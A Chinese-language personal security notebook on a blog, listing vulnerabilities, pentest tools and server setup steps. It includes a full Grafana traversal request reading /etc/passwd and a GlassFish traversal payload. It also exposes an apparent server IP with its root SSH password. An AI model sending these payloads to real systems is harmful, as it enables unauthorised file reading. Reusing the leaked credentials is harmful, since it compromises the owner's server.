<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">suid 普通用户执行 但文件执行权限是文件属性的权限 若为root就能获得最高权限</span><br><span class="line">-rwsr-xr-x.   1 root root       27856 Mar 31  2020 passwd</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S2-055 Jackson反序列化</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S2-052 Xstream反序列化</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S2-012 重定向的路径中使用了%&#123;&#125;导致了RCE漏洞</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S2-016 namespace处插入OGNL代码引发漏洞</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S2-057 namespace处插入OGNL代码引发的漏洞</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S2-013 链接标签带入参数时导致OGNL解析漏洞</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">启动frp客户端 ./frpc -s frpc.ini</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom</span><br><span class="line">	--list archs 查看支持的系统架构</span><br><span class="line">	-e	payload编码</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf常用监听模块 Exploit/multi/handler</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php中require()函数包含出错的话，会直接退出</span><br><span class="line">include_once包含出错警告</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">脏牛漏洞提权的原理是Linux内核中mm/gup.c的竞争条件允许本地用户提升权限</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">畸形解析不存在IIS6.5 存在IIS7.5 Nginx&lt;8.03 IIS7.0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GlassFish Directory Traversal（CVE-2017-1000028）java语言中会把 %c0%af解析为\uEUDF，最后转义为ASCCII字符的/（斜杠）。利用..%c0%af..%c0%af 来向上跳转，达到目录穿越、任意文件读取的效果</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用Dirtv Pipe漏洞，可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权 root</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">re.compile(r&#x27;&lt;div class=&quot;sub&quot;&gt;(.*?)&lt;/div&gt;&#x27;, re.S) </span><br><span class="line">	被采集的数据中有多行，有换行符所以要加re.S或者re.DOTALL，换行读取数据，要不行只能读取一行，如果第一行是空格就不能采集到数据，或者采集不全。</span><br><span class="line">	正则表达式中&#x27;. &#x27;匹配的除&#x27;\n&#x27;以外所有字符，设置 DOTALL模式，让 . 匹配包括 &#x27;\n&#x27; 所有字符。</span><br><span class="line">	</span><br><span class="line">re.I(re.IGNORECASE) ：使匹配对大小写不敏感</span><br><span class="line">re.L(re.LOCAL) ：做本地化识别（locale-aware）匹配</span><br><span class="line">re.M(re.MULTILINE) ：多行匹配，影响 ^ 和 $</span><br><span class="line">re.S(re.DOTALL) ：使 . 匹配包括换行在内的所有字符</span><br><span class="line">re.U(re.UNICODE)：根据Unicode字符集解析字符。这个标志影响 \w, \W, \b, \B.</span><br><span class="line">re.X(re.VERBOSE)：该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shiro RememberMe Cookie 	AES</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IIS6.0 默认可执行文件 .asp .asa .cer .cdx</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230426134217143.png" alt="image-20230426134217143"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shiro-682</span><br><span class="line">	由于shiro与spring处理路径时URL解码和路径标准化顺序不一致导致的使用 &quot;%3b&quot; 绕过</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap level参数为2 检测cookie注入</span><br><span class="line">	不支持redis数据库</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2022-0185 Linux内核溢出漏洞容器场景下拥有CAP_SYS_ADMIN权限导致容器逃逸到宿主主机</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">加密密钥硬编码存在shiro 1.2.4版本之前</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jboss默认环境路径/invoker/JMXInvokerServlet 出现下载该文件 说明接口开放 此接口存在反序列化漏洞</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcat默认控制台的web路径</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export定义shell的全局变量</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">蓝凌OA 前台SSRF到RCE 任意文件上传 EKP后台SQL注入漏洞</span><br><span class="line"></span><br><span class="line">websphere常用端口 9060 9080 8880</span><br><span class="line"></span><br><span class="line">致远(Seeyon) </span><br><span class="line">	A8-v5任意用户密码修改</span><br><span class="line">	A8 htmlofficeservlet</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230426135610352.png" alt="image-20230426135610352"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文件上传绕过方式</span><br><span class="line">	畸形协议 溢出Content-Disposition 修改HOST</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230426151528707.png" alt="image-20230426151528707"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk结构的状态</span><br><span class="line">top chunk 		allocated chunk</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nginx配置错误导致</span><br><span class="line">	CRLF注入 目录遍历 目录穿越</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tomcat 被上传webshell原因</span><br><span class="line">	Tomcat 8009端口AJP协议开启</span><br><span class="line">	配置Tomcat使用常用的用户名和弱口令密码</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">整数溢出可能转换为 堆溢出 栈溢出 数组越界</span><br><span class="line"></span><br><span class="line">整数漏洞常见情形</span><br><span class="line">	无符号数存进了有符号变量</span><br><span class="line">	作比较忽略了有符号数可以为负数</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Coremail 配置信息泄露 存储XSS CSRF 接口未授权</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.Net</span><br><span class="line">	XmlSerializer</span><br><span class="line">        serializer.Deserialize(类型可控)</span><br><span class="line">        new XmlSerializer(内容可控)</span><br><span class="line">	BinaryFormatter</span><br><span class="line">		BinaryFormatteer::Dserialize 反序列化内容用户可控</span><br><span class="line">		Net SDK大于等于4.5</span><br></pre></td></tr></table></figure>

<h3 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">web136</span><br><span class="line">	tee 读取标准输入内容，将读取到的数据写到标准输出和文件</span><br><span class="line"></span><br><span class="line">intval	获取变量证书值 转化字符 到第一个非数字的字符</span><br></pre></td></tr></table></figure>

<h3 id="grafana"><a href="#grafana" class="headerlink" title="grafana"></a>grafana</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">默认端口3000</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Grafana 8.x Plugin Module File Path Traversal (CVE-2021-43798)</span><br><span class="line">插件模块存在目录穿越漏洞</span><br><span class="line">alertlist</span><br><span class="line">cloudwatch</span><br><span class="line">dashlist</span><br><span class="line">elasticsearch</span><br><span class="line">graph</span><br><span class="line">graphite</span><br><span class="line">heatmap</span><br><span class="line">influxdb</span><br><span class="line">mysql</span><br><span class="line">opentsdb</span><br><span class="line">pluginlist</span><br><span class="line">postgres</span><br><span class="line">prometheus</span><br><span class="line">stackdriver</span><br><span class="line">table</span><br><span class="line">text</span><br><span class="line">GET /public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd HTTP/1.1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grafana8.5.4</span><br><span class="line">管理后台ssrf</span><br></pre></td></tr></table></figure>

<h3 id="openssh"><a href="#openssh" class="headerlink" title="openssh"></a>openssh</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OpenSSH 命令注入漏洞(CVE-2020-15778)复现</span><br></pre></td></tr></table></figure>

<h3 id="vmware挂载共享文件夹"><a href="#vmware挂载共享文件夹" class="headerlink" title="vmware挂载共享文件夹"></a>vmware挂载共享文件夹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">参考https://blog.csdn.net/weixin_45888098/article/details/128890289</span><br><span class="line">1.vmware设置中启用共享文件夹 并设置主机路径 D:\shared_document</span><br><span class="line">2.需要安装vmware tool		apt-get install open-vm-tools-desktop fuse</span><br><span class="line">3.vmware-hgfsclient		查看共享目录</span><br><span class="line">4.创建目录		mkdir -p /mnt/hgfs/shared_document</span><br><span class="line">5.挂载	/usr/bin/vmhgfs-fuse .host:/shared_document /mnt/hgfs/shared_document -o subtype=vmhgfs-fuse,allow_other</span><br><span class="line"></span><br><span class="line">6.开机需要重新挂载 添加自动挂载</span><br><span class="line">	vim /etc/fstab</span><br><span class="line">		.host:/shared_document /mnt/hgfs/shared_document fuse.vmhgfs-fuse allow 0 0</span><br></pre></td></tr></table></figure>

<h3 id="8080端口被占用"><a href="#8080端口被占用" class="headerlink" title="8080端口被占用"></a>8080端口被占用</h3><p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230521202926073.png" alt="image-20230521202926073"></p>
<h3 id="adb调试华为"><a href="#adb调试华为" class="headerlink" title="adb调试华为"></a>adb调试华为</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#允许ADB调试</span><br><span class="line">	1.【设置】→【系统和更新】→【开发人员选项】（如果没有这个按钮需要去【关于手机】→【版本号】→点击5次即可进入开发者模式）点击仅充电模式下允许ADB调试！</span><br><span class="line">连接数据线的情况下</span><br><span class="line">	adb tcpip 12321		#开启了一个类似ssh的服务</span><br><span class="line"></span><br><span class="line">#需要手机和电脑端在一个ip下</span><br><span class="line">adb connect 192.168.200.15:12321</span><br><span class="line"></span><br><span class="line">#UMX0220908023656是我忘记拔掉数据线 这个设备是数据线连接的</span><br><span class="line">C:\Users\hyy&gt;adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">UMX0220908023656        device</span><br><span class="line">192.168.200.15:12321    device</span><br><span class="line"></span><br><span class="line">#选中要连接的设备</span><br><span class="line">adb -s 192.168.200.15:12321 shell</span><br><span class="line">adb -s UMX0220908023656 shell</span><br><span class="line"></span><br><span class="line">#或者拔掉数据线</span><br><span class="line">adb shell</span><br><span class="line"></span><br><span class="line">#但是不是root权限 只有shell权限 adb root执行不了</span><br></pre></td></tr></table></figure>

<h3 id="frp-内网映射外网"><a href="#frp-内网映射外网" class="headerlink" title="frp 内网映射外网"></a>frp 内网映射外网</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">映射到也可以用cpolar 只是不能指定ip 是用别人的随机域名</span><br><span class="line">frp映射</span><br><span class="line">	https://blog.csdn.net/oyy_1126/article/details/115702152</span><br><span class="line">服务端</span><br><span class="line">	需开启防火墙 firewall和腾讯云 frp端口以及被映射的端口</span><br><span class="line">	frps.ini 只需设置一个frp服务端口即可</span><br><span class="line">	frps -c frps.ini</span><br><span class="line">客户端</span><br><span class="line">	无需打开防火墙</span><br><span class="line">	frpc -c frpc.ini</span><br></pre></td></tr></table></figure>

<h3 id="服务器centos安装msf"><a href="#服务器centos安装msf" class="headerlink" title="服务器centos安装msf"></a>服务器centos安装msf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_44268918/article/details/129771330</span><br></pre></td></tr></table></figure>

<h3 id="Centos搭建云服务器"><a href="#Centos搭建云服务器" class="headerlink" title="Centos搭建云服务器"></a>Centos搭建云服务器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">重装	2核40g</span><br><span class="line">ssh root@1.117.139.173</span><br><span class="line">123456Hyy</span><br><span class="line"></span><br><span class="line">虚拟机重装centos 公钥问题</span><br><span class="line">rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022</span><br><span class="line"></span><br><span class="line">这个报错重装之后会有，把这个文件删了</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\1656411333134.png" alt="1656411333134"></p>
<h3 id="宝塔-Docker-Halo"><a href="#宝塔-Docker-Halo" class="headerlink" title="宝塔+Docker+Halo"></a>宝塔+Docker+Halo</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">安装宝塔</span><br><span class="line">	https://bt.cn/bbs/thread-19376-1-1.html</span><br><span class="line"></span><br><span class="line">yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh			install.sh文件下载在/root文件夹下</span><br><span class="line">bt default查看内外网地址及密码</span><br><span class="line">安装选择左边的ngnix		面板8888端口放行</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\1665632561044.png" alt="1665632561044"></p>
<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\1656426236040.png" alt="1656426236040"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">安装docker</span><br><span class="line">	https://docs.docker.com/engine/install/centos/</span><br><span class="line">	</span><br><span class="line">yum update    #可以不升级</span><br><span class="line">#设置资源</span><br><span class="line">yum install -y yum-utils</span><br><span class="line">yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line">#安装docker引擎</span><br><span class="line">systemctl start docker			#启动一下</span><br><span class="line">docker run hello-world			</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">docker安装halo</span><br><span class="line">	https://docs.halo.run/getting-started/install/docker/</span><br><span class="line"></span><br><span class="line">mkdir ~/.halo &amp;&amp; cd ~/.halo			#管理元权限执行，pwd为/root/.halo</span><br><span class="line">wget https://dl.halo.run/config/application-template.yaml -O ./application.yaml</span><br><span class="line">vim application.yaml				#默认8090端口		默认H2database</span><br><span class="line">docker pull halohub/halo:1.5.3		#拉取最新的Halo镜像</span><br><span class="line">#创建容器</span><br><span class="line">docker run -it -d --name halo -p 8090:8090 -v ~/.halo:/root/.halo --restart=unless-stopped halohub/halo:1.5.3</span><br><span class="line">#此处按照博主的意思	这样改应该就可以开第二个博客在8091端口，要创建~/.halo2 此处applocation.yaml文件不用改 改文件夹加端口两个部分</span><br><span class="line">docker run -it -d --name halo2 -p 8091:8090 -v ~/.halo2:/root/.halo --restart=unless-stopped halohub/halo:1.5.3</span><br><span class="line">    -it： 开启输入功能并连接伪终端</span><br><span class="line">    -d： 后台运行容器</span><br><span class="line">    --name： 为容器指定一个名称</span><br><span class="line">    -p： 端口映射，格式为 主机(宿主)端口:容器端口 ，可在 application.yaml 配置。</span><br><span class="line">    -v： 工作目录映射。形式为：-v 宿主机路径:/root/.halo，后者不能修改。</span><br><span class="line">    --restart： 建议设置为 unless-stopped，在 Docker 启动的时候自动启动 Halo 容器</span><br><span class="line">docker会自启动两个博客</span><br><span class="line">systemctl enable docker		把docker加入自启动</span><br><span class="line"></span><br><span class="line">8090端口放行</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">绑定域名</span><br><span class="line"></span><br><span class="line">#可参考视频</span><br><span class="line">https://www.bilibili.com/video/BV1Dq4y1Z7q5?from=search&amp;seid=11693727023437818175&amp;spm_id_from=333.337.0.0&amp;vd_source=d5448e640adeda715972607248810967</span><br><span class="line">#这个网站要注册购买域名</span><br><span class="line">https://www.namesilo.com</span><br><span class="line">#使用cloudflare关联域名和ip地址，也是先注册账号</span><br><span class="line">https://developers.cloudflare.com</span><br><span class="line">#按步骤来，第三步关联（链接1），将cloudflare分配的名称服务器（链接2）关联到namaslio（链接3）</span><br><span class="line">https://developers.cloudflare.com/dns/zone-setups/full-setup/setup/</span><br><span class="line">https://dash.cloudflare.com/14c08eb2e4e0d81cdcd74e2bef1566f1/jinjidehyy.com/dns</span><br><span class="line">https://www.namesilo.com/account_domain_manage_domain.php?domain=ZmRmZwZlZmRmAQZ2ZmNmBD==5n3r9p122761r85091ors8o52rn69noq</span><br><span class="line">#多地ping查看是否绑定成功</span><br><span class="line">https://ping.chinaz.com/www.jinjidehyy.com</span><br><span class="line"></span><br><span class="line"># p8绑定域名p9反向代理没看完 网站需要备案在申请 暂不能用域名访问 还有SSL</span><br><span class="line"> [如何用服务器优雅地搭建一个博客—Hello,Halo!_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1JN411Q7Na/?spm_id_from=333.337.search-card.all.click&amp;vd_source=d5448e640adeda715972607248810967) </span><br></pre></td></tr></table></figure>

<h3 id="github-io建站"><a href="#github-io建站" class="headerlink" title="github.io建站"></a>github.io建站</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">settings中Emails取消勾选 Keep my email address private</span><br><span class="line">	hexo d 执行不了报错不能邮箱推送</span><br></pre></td></tr></table></figure>






























      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/05/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" data-id="cljpcwhtz0005l8ez87ftha1h" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2023/07/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%88%E4%BE%8B/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/07/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%88%E4%BE%8B/">(no title)</a>
          </li>
        
          <li>
            <a href="/2023/07/05/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">(no title)</a>
          </li>
        
          <li>
            <a href="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">(no title)</a>
          </li>
        
          <li>
            <a href="/2023/07/05/%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92/">(no title)</a>
          </li>
        
          <li>
            <a href="/2023/07/05/dvwa/">(no title)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>